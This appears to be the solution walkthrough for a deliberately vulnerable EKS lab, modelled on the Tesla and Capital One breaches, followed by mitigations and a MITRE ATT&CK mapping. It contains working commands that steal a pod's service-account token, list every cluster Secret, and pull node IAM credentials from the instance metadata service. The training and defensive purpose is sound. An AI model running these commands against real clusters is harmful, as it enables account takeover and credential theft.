# Solution Walkthrough: EKS Attack Chain

## Scenario Summary

An internet-facing workload has been left running on an EKS cluster with no
authentication in front of it. From that single exposed foothold you escalate two
different directions at once: **up into the Kubernetes control plane** (the pod's
service account is bound to `cluster-admin`) and **out into the AWS account** (the
worker node's IAM role carries `AdministratorAccess`, reachable through the
instance metadata service). Your goal is to go from "I can reach a pod" to "I own
the cluster and the AWS account," and to notice that nothing you did was recorded.

The chain is modeled on two named public incidents: the **2018 Tesla** breach (an
exposed, unauthenticated Kubernetes dashboard) for the entry point, and the **2019
Capital One** breach (compromise of a compute resource → steal its instance role
credentials via metadata → those credentials were far broader than the workload
needed) for the escalation out to AWS.

---

## Step 1: Find the exposed service

The vulnerable workload is published through a `LoadBalancer` service, so it has a
public address. As the operator you can read it directly; an external attacker
would find it by scanning the account's public load balancers.

```bash
# The internet-facing entry point (2018 Tesla shape)
kubectl get service vulnerable-dashboard-service
# Note the EXTERNAL-IP / ELB hostname

curl http://<external-ip>/
```

There is no authentication layer in front of it — that is the entire point of
Step 1 of the chain.

---

## Step 2: Get execution inside the pod

The pod is a stand-in for "whatever internet-facing thing got left open." In a
real engagement the exposed application would be exploited for remote code
execution; the same foothold is shown here with `kubectl exec`:

```bash
POD=$(kubectl get pod -l app=vulnerable-dashboard -o jsonpath='{.items[0].metadata.name}')
kubectl exec -it "$POD" -- /bin/sh
```

The pod runs `privileged: true` with `hostNetwork: true`, so this shell has no
container isolation and shares the node's network namespace — which is what makes
the node's IMDS reachable in Step 5. Everything from here runs inside that pod.

---

## Step 3: Loot plaintext credentials from the environment

Credential-shaped values were injected into the pod from a **ConfigMap** (not a
Secret), so they sit in the process environment in plaintext:

```bash
# Inside the pod
env | grep -E 'AWS_|DB_'
# AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE0000
# AWS_SECRET_ACCESS_KEY=this-is-a-placeholder-not-a-real-credential
# DB_PASSWORD=hunter2-placeholder-not-real
```

(These are deliberately fake placeholders.) A ConfigMap is readable with far less
RBAC than a Secret and is not encrypted at rest — storing anything
credential-shaped here is the mistake Step 5 of the chain demonstrates.

---

## Step 4: Steal the service-account token → cluster-admin

The pod runs as a service account that is bound to `cluster-admin` via a
`ClusterRoleBinding`. Its projected token is mounted into the pod, so anyone with
code execution in the pod inherits full cluster control:

The pod image is `nginx:1.27-alpine` (no `kubectl`) and runs with
`hostNetwork: true`, so it uses the node's DNS and cannot resolve the in-cluster
name `kubernetes.default.svc`. Both are non-issues: Kubernetes injects the API
server's address as env vars into every pod, and `curl` is all you need.

```bash
# Inside the pod
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
# Reach the API server by IP (injected env vars) - no cluster DNS needed
APISERVER=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}

# Confirm the blast radius - a SelfSubjectRulesReview is a POST with a body
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -X POST \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -d '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"default"}}'
# cluster-admin tell: resourceRules with "verbs":["*"],"apiGroups":["*"],"resources":["*"]

# In practice: read every Secret in every namespace (values are base64)
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/secrets | grep '"name"'
```

`cluster-admin` on a workload service account means: read every Secret in every
namespace, create or delete anything, and modify RBAC itself. Compare against
[range-01](../../range-01-eks-secure-baseline/README.md)'s narrowly-scoped
IRSA/OIDC approach — this is what skipping that discipline looks like.

---

## Step 5: Steal the node IAM role via IMDS → AWS account admin

The worker node's IAM role has `AdministratorAccess` attached (Step 4 of the
chain, in `terraform/iam.tf`). From a process on the node you can pull that role's
temporary credentials out of the Instance Metadata Service and use them directly:

```bash
# From the host-networked pod (Step 2), which shares the node's network
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
# -> AccessKeyId / SecretAccessKey / Token for a role with AdministratorAccess
```

Load those into the AWS CLI and you are account admin:

```bash
aws sts get-caller-identity          # now the node role
aws s3 ls                            # ...with AdministratorAccess behind it
```

This is the Capital One shape: compromise compute → steal its instance-role creds
via metadata → the role is far broader than the workload ever needed. Enforcing
IMDSv2 (`http_tokens = "required"`) with a hop limit of 1 is the control that
would cut this step off.

---

## Step 6: Confirm there's no audit trail

None of the above generated a control-plane audit record, because the cluster
ships with all log types disabled (Step 6 of the chain):

```bash
aws eks describe-cluster --name <cluster-name> \
  --query 'cluster.logging.clusterLogging'
# -> every log type "enabled": false
```

Contrast against [range-01](../../range-01-eks-secure-baseline/README.md),
which enables `["api", "audit", "authenticator", "controllerManager", "scheduler"]`. With logging off there is no
CloudWatch trail to reconstruct how any of Steps 1–5 happened.

---

## Why This Works

1. **Exposed workload, no auth (Step 1)**: a `LoadBalancer` service publishes the
   pod to the internet with no authentication layer in front of it — the initial
   access point, Tesla-shaped.
2. **Privileged, host-networked pod (Step 2)**: `privileged: true` +
   `hostNetwork: true` remove container isolation and put the pod on the node's
   network, turning code execution in the pod into node-level access — including
   the node's IMDS.
3. **Plaintext secrets in a ConfigMap (Step 3)**: credential-shaped values in a
   ConfigMap are readable with minimal RBAC and unencrypted at rest.
4. **`cluster-admin` on a workload SA (Step 4)**: binding `cluster-admin` to a
   pod's service account means code execution in that pod is full cluster
   compromise, and the token is sitting mounted in the pod for the taking.
5. **Over-privileged node role (Step 5)**: `AdministratorAccess` on the node role
   turns "reach the metadata service" into "own the AWS account." Least privilege
   would have scoped the node role to only what a worker needs.
6. **No control-plane audit logging (Step 6)**: with all log types disabled,
   there is no forensic record of the intrusion — the defender's blind spot.

---

## Defensive Mitigations

| Vulnerability | Mitigation |
|---|---|
| Internet-facing pod, no auth | Don't expose admin/dashboard workloads via `LoadBalancer`; put an authenticating ingress/proxy in front, restrict source ranges, and prefer private endpoints |
| Privileged, host-networked pod | Enforce Pod Security Admission (`restricted`) or Kyverno policies that deny `privileged`, `hostNetwork`, and `hostPID`; drop all Linux capabilities and run as non-root |
| `cluster-admin` bound to a workload SA | Bind service accounts to least-privilege Roles; never grant `cluster-admin` to a workload; use IRSA/OIDC for per-workload AWS scoping |
| Over-privileged node IAM role | Scope the node role to the three managed policies a worker needs (worker/CNI/ECR-read); never attach `AdministratorAccess`; use IRSA so pods don't inherit the node role |
| Plaintext credentials in a ConfigMap | Use Kubernetes Secrets (with KMS envelope encryption) or pull from AWS Secrets Manager at runtime; never put credentials in ConfigMaps |
| IMDSv1 reachable from a host-networked pod | Enforce IMDSv2 (`http_tokens = "required"`) and set the hop limit to 1 so pods can't reach the node's metadata credentials |
| No control-plane audit logging | Enable `["api", "audit", "authenticator", "controllerManager", "scheduler"]` cluster log types and alert on anomalous API activity |

---

## MITRE ATT&CK Mapping

| Tactic | Technique |
|---|---|
| Initial Access | T1190 — Exploit Public-Facing Application |
| Execution | T1609 — Container Administration Command |
| Discovery | T1613 — Container and Resource Discovery |
| Credential Access | T1552.001 — Unsecured Credentials: Credentials In Files (ConfigMap) |
| Credential Access | T1528 — Steal Application Access Token (service-account token) |
| Credential Access | T1552.005 — Unsecured Credentials: Cloud Instance Metadata API |
| Privilege Escalation | T1611 — Escape to Host (privileged / hostNetwork pod) |
| Privilege Escalation | T1078.004 — Valid Accounts: Cloud Accounts (stolen node role) |
| Defense Evasion | T1562.008 — Impair Defenses: Disable or Modify Cloud Logs |
| Collection | T1530 — Data from Cloud Storage |
